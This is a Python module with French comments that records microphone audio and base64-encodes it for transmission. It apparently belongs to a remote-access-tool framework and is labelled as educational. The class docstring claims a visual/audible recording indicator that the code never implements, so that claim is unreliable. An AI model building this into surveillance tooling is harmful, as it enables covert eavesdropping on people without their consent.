"""
Audio Recorder Module - Enregistrement audio
⚠️ USAGE ÉDUCATIF UNIQUEMENT - Avec consentement explicite ⚠️
Inspiré des capacités de surveillance audio des RATs modernes
"""

import threading
import time
import wave
import io
import base64
from datetime import datetime
from typing import Dict, Any, Optional
import logging

try:
    import pyaudio
    PYAUDIO_AVAILABLE = True
except ImportError:
    PYAUDIO_AVAILABLE = False

logger = logging.getLogger(__name__)

class AudioRecorderModule:
    """
    Module d'enregistrement audio avec garde-fous de sécurité
    
    GARDE-FOUS IMPLÉMENTÉS:
    - Durée maximale d'enregistrement limitée
    - Indication visuelle/audible d'enregistrement
    - Qualité audio limitée pour la confidentialité
    - Logs d'audit complets
    """
    
    def __init__(self):
        # Paramètres audio
        self.SAMPLE_RATE = 16000  # 16kHz (qualité réduite pour confidentialité)
        self.CHANNELS = 1  # Mono
        self.SAMPLE_WIDTH = 2  # 16-bit
        self.CHUNK_SIZE = 1024
        
        # Limitations de sécurité
        self.MAX_DURATION = 120  # 2 minutes maximum
        self.MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB max
        self.MIN_RECORDING_INTERVAL = 5  # 5s entre enregistrements
        
        # État de l'enregistrement
        self.is_recording = False
        self.recording_thread = None
        self.audio_stream = None
        self.pyaudio_instance = None
        self.last_recording_time = 0
        
        # Buffer d'enregistrement
        self.audio_buffer = []
        self.recording_start_time = None
        
        # Statistiques
        self.recordings_made = 0
        self.total_recording_time = 0
        self.total_audio_size = 0
        
        # Vérification de la disponibilité
        if not PYAUDIO_AVAILABLE:
            logger.warning("PyAudio non disponible - enregistrement audio désactivé")
        else:
            self._test_audio_devices()
    
    def _test_audio_devices(self):
        """Teste la disponibilité des périphériques audio"""
        try:
            test_audio = pyaudio.PyAudio()
            
            # Vérification d'un périphérique d'entrée
            device_count = test_audio.get_device_count()
            self.input_devices = []
            
            for i in range(device_count):
                try:
                    device_info = test_audio.get_device_info_by_index(i)
                    if device_info['maxInputChannels'] > 0:
                        self.input_devices.append({
                            'index': i,
                            'name': device_info['name'],
                            'channels': device_info['maxInputChannels'],
                            'sample_rate': device_info['defaultSampleRate']
                        })
                except:
                    continue
            
            test_audio.terminate()
            
            if not self.input_devices:
                logger.warning("Aucun périphérique d'entrée audio détecté")
            else:
                logger.info(f"{len(self.input_devices)} périphérique(s) audio détecté(s)")
                
        except Exception as e:
            logger.error(f"Erreur test périphériques audio: {e}")
            self.input_devices = []
    
    def record_audio(self, duration: int = 10, device_index: int = None) -> Dict[str, Any]:
        """
        Enregistre l'audio du microphone
        
        Args:
            duration: Durée en secondes (max: MAX_DURATION)  
            device_index: Index du périphérique audio (None = défaut)
        
        Returns:
            Dict avec les données audio encodées
        """
        try:
            if not PYAUDIO_AVAILABLE:
                return {
                    'status': 'error',
                    'output': 'PyAudio requis pour l\'enregistrement audio'
                }
            
            if self.is_recording:
                return {
                    'status': 'error',
                    'output': 'Enregistrement déjà en cours'
                }
            
            # Vérification de l'intervalle minimum
            current_time = time.time()
            if (current_time - self.last_recording_time) < self.MIN_RECORDING_INTERVAL:
                remaining = self.MIN_RECORDING_INTERVAL - (current_time - self.last_recording_time)
                return {
                    'status': 'error',
                    'output': f'Attendez {remaining:.1f}s avant le prochain enregistrement'
                }
            
            # Limitation de la durée
            duration = max(1, min(duration, self.MAX_DURATION))
            
            # Vérification des périphériques
            if not hasattr(self, 'input_devices') or not self.input_devices:
                return {
                    'status': 'error',
                    'output': 'Aucun périphérique d\'entrée audio disponible'
                }
            
            # Sélection du périphérique
            if device_index is not None:
                if device_index >= len(self.input_devices):
                    return {
                        'status': 'error',
                        'output': f'Index de périphérique invalide: {device_index}'
                    }
                selected_device = self.input_devices[device_index]
            else:
                selected_device = self.input_devices[0]  # Premier périphérique par défaut
            
            # Démarrage de l'enregistrement
            result = self._start_recording(duration, selected_device)
            
            if result['status'] == 'success':
                self.last_recording_time = current_time
            
            return result
            
        except Exception as e:
            logger.error(f"Erreur enregistrement audio: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'enregistrement: {str(e)}'
            }
    
    def _start_recording(self, duration: int, device_info: Dict[str, Any]) -> Dict[str, Any]:
        """Démarre l'enregistrement audio"""
        try:
            # Initialisation PyAudio
            self.pyaudio_instance = pyaudio.PyAudio()
            
            # Configuration du stream audio
            try:
                self.audio_stream = self.pyaudio_instance.open(
                    format=pyaudio.paInt16,
                    channels=self.CHANNELS,
                    rate=self.SAMPLE_RATE,
                    input=True,
                    input_device_index=device_info['index'],
                    frames_per_buffer=self.CHUNK_SIZE
                )
            except Exception as e:
                self.pyaudio_instance.terminate()
                return {
                    'status': 'error',
                    'output': f'Impossible d\'ouvrir le périphérique audio: {str(e)}'
                }
            
            # Réinitialisation du buffer
            self.audio_buffer.clear()
            self.recording_start_time = time.time()
            self.is_recording = True
            
            # Thread d'enregistrement
            self.recording_thread = threading.Thread(
                target=self._recording_worker,
                args=(duration,)
            )
            self.recording_thread.daemon = True
            self.recording_thread.start()
            
            # Attente de la fin de l'enregistrement
            self.recording_thread.join()
            
            # Traitement des données enregistrées
            return self._process_recorded_audio(duration, device_info)
            
        except Exception as e:
            # Nettoyage en cas d'erreur
            self._cleanup_recording()
            return {
                'status': 'error',
                'output': f'Erreur durant l\'enregistrement: {str(e)}'
            }
    
    def _recording_worker(self, duration: int):
        """Thread worker pour l'enregistrement"""
        try:
            frames_to_record = int(self.SAMPLE_RATE * duration / self.CHUNK_SIZE)
            
            for i in range(frames_to_record):
                if not self.is_recording:
                    break
                
                try:
                    # Lecture d'un chunk audio
                    audio_data = self.audio_stream.read(self.CHUNK_SIZE, exception_on_overflow=False)
                    self.audio_buffer.append(audio_data)
                    
                    # Vérification de la taille maximale
                    if len(b''.join(self.audio_buffer)) > self.MAX_FILE_SIZE:
                        logger.warning("Taille maximale atteinte - arrêt de l'enregistrement")
                        break
                        
                except Exception as e:
                    logger.error(f"Erreur lecture audio: {e}")
                    break
            
        except Exception as e:
            logger.error(f"Erreur dans recording worker: {e}")
        finally:
            self.is_recording = False
    
    def _process_recorded_audio(self, duration: int, device_info: Dict[str, Any]) -> Dict[str, Any]:
        """Traite les données audio enregistrées"""
        try:
            # Nettoyage des ressources
            self._cleanup_recording()
            
            if not self.audio_buffer:
                return {
                    'status': 'error',
                    'output': 'Aucune donnée audio enregistrée'
                }
            
            # Calcul de la durée réelle
            actual_duration = time.time() - self.recording_start_time
            
            # Conversion en format WAV
            wav_data = self._create_wav_file(self.audio_buffer)
            if not wav_data:
                return {
                    'status': 'error',
                    'output': 'Erreur lors de la création du fichier WAV'
                }
            
            # Encodage base64 pour transmission
            encoded_audio = base64.b64encode(wav_data).decode('utf-8')
            
            # Génération du nom de fichier
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"audio_recording_{timestamp}.wav"
            
            # Mise à jour des statistiques
            self.recordings_made += 1
            self.total_recording_time += actual_duration
            self.total_audio_size += len(wav_data)
            
            logger.info(f"Enregistrement audio terminé: {filename} ({len(wav_data)} bytes)")
            
            return {
                'status': 'success',
                'output': f'Enregistrement terminé: {filename} ({actual_duration:.1f}s, {len(wav_data)} bytes)',
                'file_data': encoded_audio,
                'filename': filename,
                'duration': round(actual_duration, 1),
                'file_size': len(wav_data),
                'sample_rate': self.SAMPLE_RATE,
                'channels': self.CHANNELS,
                'device_used': device_info['name'],
                'timestamp': datetime.now().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Erreur traitement audio: {e}")
            return {
                'status': 'error',
                'output': f'Erreur lors du traitement: {str(e)}'
            }
    
    def _create_wav_file(self, audio_chunks: list) -> Optional[bytes]:
        """Crée un fichier WAV à partir des chunks audio"""
        try:
            # Concaténation des chunks
            audio_data = b''.join(audio_chunks)
            
            # Création du fichier WAV en mémoire
            wav_buffer = io.BytesIO()
            
            with wave.open(wav_buffer, 'wb') as wav_file:
                wav_file.setnchannels(self.CHANNELS)
                wav_file.setsampwidth(self.SAMPLE_WIDTH)
                wav_file.setframerate(self.SAMPLE_RATE)
                wav_file.writeframes(audio_data)
            
            return wav_buffer.getvalue()
            
        except Exception as e:
            logger.error(f"Erreur création WAV: {e}")
            return None
    
    def _cleanup_recording(self):
        """Nettoie les ressources d'enregistrement"""
        try:
            self.is_recording = False
            
            if self.audio_stream:
                try:
                    self.audio_stream.stop_stream()
                    self.audio_stream.close()
                except:
                    pass
                self.audio_stream = None
            
            if self.pyaudio_instance:
                try:
                    self.pyaudio_instance.terminate()
                except:
                    pass
                self.pyaudio_instance = None
                
        except Exception as e:
            logger.error(f"Erreur nettoyage enregistrement: {e}")
    
    def stop_recording(self) -> Dict[str, Any]:
        """Arrête l'enregistrement en cours"""
        try:
            if not self.is_recording:
                return {
                    'status': 'error',
                    'output': 'Aucun enregistrement en cours'
                }
            
            self.is_recording = False
            
            # Attendre la fin du thread
            if self.recording_thread and self.recording_thread.is_alive():
                self.recording_thread.join(timeout=2)
            
            # Nettoyage
            self._cleanup_recording()
            
            return {
                'status': 'success',
                'output': 'Enregistrement arrêté'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur lors de l\'arrêt: {str(e)}'
            }
    
    def list_audio_devices(self) -> Dict[str, Any]:
        """Liste les périphériques audio disponibles"""
        try:
            if not PYAUDIO_AVAILABLE:
                return {
                    'status': 'error',
                    'output': 'PyAudio non disponible'
                }
            
            if not hasattr(self, 'input_devices'):
                self._test_audio_devices()
            
            if not self.input_devices:
                return {
                    'status': 'info',
                    'output': 'Aucun périphérique d\'entrée détecté',
                    'devices': []
                }
            
            return {
                'status': 'success',
                'output': f'{len(self.input_devices)} périphérique(s) audio détecté(s)',
                'devices': self.input_devices
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur: {str(e)}'
            }
    
    def get_audio_info(self) -> Dict[str, Any]:
        """Retourne les informations sur le module audio"""
        try:
            info = {
                'pyaudio_available': PYAUDIO_AVAILABLE,
                'is_recording': self.is_recording,
                'recordings_made': self.recordings_made,
                'total_recording_time': round(self.total_recording_time, 1),
                'total_audio_size': self.total_audio_size,
                'input_devices_count': len(getattr(self, 'input_devices', [])),
                'settings': {
                    'sample_rate': self.SAMPLE_RATE,
                    'channels': self.CHANNELS,
                    'sample_width': self.SAMPLE_WIDTH,
                    'chunk_size': self.CHUNK_SIZE,
                    'max_duration': self.MAX_DURATION,
                    'max_file_size': self.MAX_FILE_SIZE,
                    'min_recording_interval': self.MIN_RECORDING_INTERVAL
                }
            }
            
            if self.is_recording and self.recording_start_time:
                info['current_recording_duration'] = time.time() - self.recording_start_time
            
            return {
                'status': 'success',
                'output': 'Informations audio récupérées',
                'data': info
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur: {str(e)}'
            }
    
    def test_microphone(self, duration: int = 2) -> Dict[str, Any]:
        """
        Teste le microphone avec un enregistrement court
        
        Args:
            duration: Durée du test en secondes (max 5s)
        
        Returns:
            Dict avec les résultats du test
        """
        try:
            if not PYAUDIO_AVAILABLE:
                return {
                    'status': 'error',
                    'output': 'PyAudio requis pour le test microphone'
                }
            
            if self.is_recording:
                return {
                    'status': 'error',
                    'output': 'Test impossible pendant un enregistrement'
                }
            
            # Limitation de la durée de test
            duration = max(1, min(duration, 5))
            
            # Test rapide d'enregistrement
            test_audio = pyaudio.PyAudio()
            
            try:
                # Tentative d'ouverture du stream
                test_stream = test_audio.open(
                    format=pyaudio.paInt16,
                    channels=self.CHANNELS,
                    rate=self.SAMPLE_RATE,
                    input=True,
                    frames_per_buffer=self.CHUNK_SIZE
                )
                
                # Test de lecture pendant quelques secondes
                test_data = []
                test_frames = int(self.SAMPLE_RATE * duration / self.CHUNK_SIZE)
                
                for _ in range(test_frames):
                    try:
                        chunk = test_stream.read(self.CHUNK_SIZE, exception_on_overflow=False)
                        test_data.append(chunk)
                    except Exception as e:
                        test_stream.close()
                        test_audio.terminate()
                        return {
                            'status': 'error',
                            'output': f'Erreur lecture microphone: {str(e)}'
                        }
                
                test_stream.close()
                test_audio.terminate()
                
                # Analyse basique du signal
                total_data = b''.join(test_data)
                signal_strength = self._analyze_audio_signal(total_data)
                
                return {
                    'status': 'success',
                    'output': f'Test microphone réussi ({duration}s)',
                    'test_duration': duration,
                    'data_size': len(total_data),
                    'signal_strength': signal_strength,
                    'microphone_working': signal_strength > 0.01  # Seuil arbitraire
                }
                
            except Exception as e:
                test_audio.terminate()
                return {
                    'status': 'error',
                    'output': f'Impossible d\'accéder au microphone: {str(e)}'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'output': f'Erreur test microphone: {str(e)}'
            }
    
    def _analyze_audio_signal(self, audio_data: bytes) -> float:
        """
        Analyse basique du signal audio pour détecter l'activité
        
        Args:
            audio_data: Données audio brutes
        
        Returns:
            float: Force du signal (0.0 à 1.0)
        """
        try:
            import struct
            
            # Conversion des bytes en échantillons 16-bit
            samples = struct.unpack(f'<{len(audio_data)//2}h', audio_data)
            
            # Calcul de la moyenne quadratique (RMS)
            if not samples:
                return 0.0
            
            rms = (sum(sample**2 for sample in samples) / len(samples)) ** 0.5
            
            # Normalisation (approximative pour du 16-bit)
            return min(rms / 32768.0, 1.0)
            
        except Exception:
            return 0.0